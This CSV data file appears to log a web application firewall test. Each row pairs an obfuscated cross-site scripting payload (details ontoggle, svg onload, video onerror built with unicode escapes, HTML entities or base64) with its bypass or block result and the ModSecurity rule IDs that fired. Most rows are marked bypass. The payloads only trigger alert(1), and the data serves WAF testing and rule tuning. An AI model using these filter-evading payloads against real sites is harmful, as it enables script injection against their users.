1106,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details class=d>b</details></details>",0,1,bypass,2,"941100,941120","v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628845095.485052
1107,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details class=e>c</details></details>,0,1,bypass,2,"941100,941120","v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628845010.567126
1108,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details style=f>d</details></details>",0,1,block,4,"941100,941120,941160,949110","v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,63v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628845211.345024
1109,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details style=g>e</details></details>,0,1,block,4,"941100,941120,941160,949110","v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,61v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628845255.787713
1110,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><div><details open>f</details></div></details>",0,1,bypass,2,"941100,941120","v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628845311.730363
1111,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><div><details open>g</details></div></details>,0,1,bypass,2,"941100,941120","v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628845490.753669
1112,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><span><details open>h</details></span></details>",0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628845583.824390
1113,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><span><details open>i</details></span></details>,0,1,bypass,2,"941100,941120","v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628845633.247543
1114,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><p><details open>j</details></p></details>",0,1,bypass,2,"941100,941120","v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628845738.247669
1115,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><p><details open>k</details></p></details>,0,1,bypass,2,"941100,941120","v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628845880.814510
1116,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><section><details>l</details></section></details>",0,1,bypass,2,"941100,941120","v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628845996.411310
1117,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><section><details>m</details></section></details>,0,1,bypass,2,"941100,941120","v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628845982.336844
1118,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><article><details>n</details></article></details>",0,1,bypass,2,"941100,941120","v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628846045.641531
1119,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><article><details>o</details></article></details>,0,1,bypass,2,"941100,941120","v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628846155.815039
1120,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><main><details>p</details></main></details>",0,1,bypass,2,"941100,941120","v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628846276.836994
1121,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><main><details>q</details></main></details>,0,1,bypass,2,"941100,941120","v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628846341.327983
1122,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><aside><details>r</details></aside></details>",0,1,bypass,2,"941100,941120","v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628846451.642733
1123,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><aside><details>s</details></aside></details>,0,1,bypass,2,"941100,941120","v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628846521.562261
1124,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><header><details>t</details></header></details>",0,1,bypass,2,"941100,941120","v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762884661.327712
1125,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><header><details>u</details></header></details>,0,1,bypass,2,"941100,941120","v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628846753.133283
1126,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><footer><details>v</details></footer></details>",0,1,bypass,2,"941100,941120","v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628846870.323505
1127,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><footer><details>w</details></footer></details>,0,1,bypass,2,"941100,941120","v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628846976.364697
1128,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><nav><details>x</details></nav></details>",0,1,bypass,2,"941100,941120","v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628847068.756455
1129,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><nav><details>y</details></nav></details>,0,1,bypass,2,"941100,941120","v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628847199.569206
1130,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><form><details>z</details></form></details>",0,1,block,5,"941100,941120,941140,941160,949110","v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o48,6v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o48,5v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17762884723.260720
1131,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><form><details>a</details></form></details>,0,1,block,5,"941100,941120,941140,941160,949110","v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,6v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,5v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177628847387.424033
1132,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><fieldset><details>b</details></fieldset></details>",0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628847428.273968
1134,<details ontoggle=Function(&quot;&#92;u0061&#92;u006c&#92;u0065&#92;u0072&#92;u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762884759.509117
1138,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details>x</details></details>",0,1,bypass,2,"941100,941120","v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628847967.697427
1139,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details open>y</details></details>",0,1,bypass,2,"941100,941120","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628847958.273158
1140,<details ontoggle=Function(&quot;\u0061\u006C\u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628848129.461409
1141,<details open ontoggle=Function(&quot;\u0061\u006C\u0065\u0072\u0074(1)&quot;)()>,0,1,bypass,2,"941100,941120","v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628848259.226083
1142,"<details ontoggle=""Function(&QUOT;\u0061\u006c\u0065\u0072\u0074(1)&QUOT;)()"" open>",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762884828.590474
1143,"<details open ontoggle=""Function(&QUOT;\u0061\u006c\u0065\u0072\u0074(1)&QUOT;)()"">",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628848318.762757
1144,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open tabindex=1>",0,1,bypass,2,"941100,941120","v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628848440.137100
1145,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" id=x>",0,1,bypass,2,"941100,941120","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628848532.831138
1146,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""></details></details>",0,1,bypass,2,"941100,941120","v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628848654.032240
1147,"<details open><details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open></details></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628848787.520268
1148,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details ontoggle=x></details></details>,0,1,bypass,2,"941100,941120","v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628848812.071088
1149,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details open ontoggle=y></details></details>,0,1,bypass,2,"941100,941120","v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628848969.462037
1150,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><!--<details>--></details>",0,1,block,4,"941100,941120,941180,949110","v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o48,4v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:lowercase,t:removeNulls || ",15,177628849041.085233
1151,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><!--<details open>--></details>",0,1,block,4,"941100,941120,941180,949110","v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o48,4v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:lowercase,t:removeNulls || ",15,177628849053.642170
1152,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details></details><details open></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628849135.496127
1153,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details open></details><details></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628849281.683874
1154,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary><details>x</details></summary></details>",0,1,bypass,2,"941100,941120","v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628849355.524890
1155,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary><details open>y</details></summary></details>",0,1,bypass,2,"941100,941120","v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628849472.541066
1157,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details open>",0,1,bypass,2,"941100,941120","v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628849692.583655
1159,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details ontoggle=""this.parentElement.ontoggle()"" open>",0,1,bypass,2,"941100,941120","v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628849851.017963
1163,"<details open ontoggle=""setTimeout(Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;))""><details>",0,1,bypass,2,"941100,941120","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762885017.331527
1357,"<video src=invalid onerror=""Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941120,941160,949110","v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o18,9v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,27v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628868097.587918
1959,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628927326.290148
1960,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762892743.328860
1961,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628927582.276944
1962,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" /></svg>",0,1,block,4,"941100,941120,941160,949110","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628927683.307465
1963,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' /></svg>,0,1,block,4,"941100,941120,941160,949110","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762892771.928179
1971,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" ></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628928568.055683
1972,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' ></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628928614.095296
1973,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() ></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762892879.728184
1974,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""/></svg>",0,1,block,4,"941100,941120,941160,949110","v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628928828.232803
1975,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'/></svg>,0,1,block,4,"941100,941120,941160,949110","v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628928955.774373
1980,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;1&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628929460.910494
